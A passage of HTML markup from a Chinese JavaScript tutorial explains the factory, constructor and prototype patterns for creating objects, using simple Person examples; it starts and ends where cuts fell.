style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span>\n <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"alert(this.name);\"</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"Software\"</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){\n}\nPerson.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; 